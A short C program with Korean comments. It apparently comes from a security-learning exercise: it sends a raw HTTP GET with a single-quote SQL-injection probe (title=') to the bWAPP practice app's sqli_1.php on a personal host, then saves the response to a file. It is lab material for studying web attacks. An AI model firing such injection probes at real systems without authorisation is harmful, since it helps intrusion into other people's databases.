#include "a.h"


int main(int argc, char *argv[]){
	int sock;
	int retval;
	int temp;
	char buf[BUFSIZE];
	FILE * fp = fopen("test.html", "w"); //출력내용을 파일에 저장하기 위해
	struct hostent *remoteHost; //웹주소를 ip로 바꾸기 위해
	 
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0)
		return 0;
	  
	remoteHost = gethostbyname("ppsspp.iptime.org"); //웹주소를 ip로 바꾸기 위해
	 
	
	struct sockaddr_in client_addr;
	client_addr.sin_family = AF_INET;
	client_addr.sin_port = htons(80);
	client_addr.sin_addr.s_addr = inet_addr(inet_ntoa(*(struct in_addr*)remoteHost->h_addr_list[0]));
	retval = connect(sock, (struct sockaddr * ) &client_addr, sizeof(client_addr));
	
	printf("_>>>%s", inet_ntoa(*(struct in_addr*)remoteHost->h_addr_list[0])); // IP check
	
	if (retval < 0)
	{
		printf("NOT connect!!!!!");
		return 0;
	}
	 
	// HTML Request Header
	char msg[500] = "GET /bWAPP/sqli_1.php?title=' HTTP/1.1\r\n";
	strcat(msg, "Host: ppsspp.iptime.org:80\r\n");
	strcat(msg, "Cookie: PHPSESSID=221b64a3b83b5d6ae6a25603e0ec3b2b; has_js=1; security_level=0;\r\n\r\n");
	
	
	send(sock, msg, strlen(msg), 0); //Send Request
	while (1){
		// receive Response
		temp = read(sock, buf, BUFSIZE-1);
		buf[temp] = '\0';
		if(temp <= 0)
			break;
	
	//	printf("%s", buf); //화면에 출력(너무 많아서 짤려서 보임)
		fprintf(fp, "%s", buf); //파일에 저장
	
		memset(buf, 0, BUFSIZE); //버퍼 지우기
	}

	close(sock);
	
	fclose(fp);
	return 0;
}
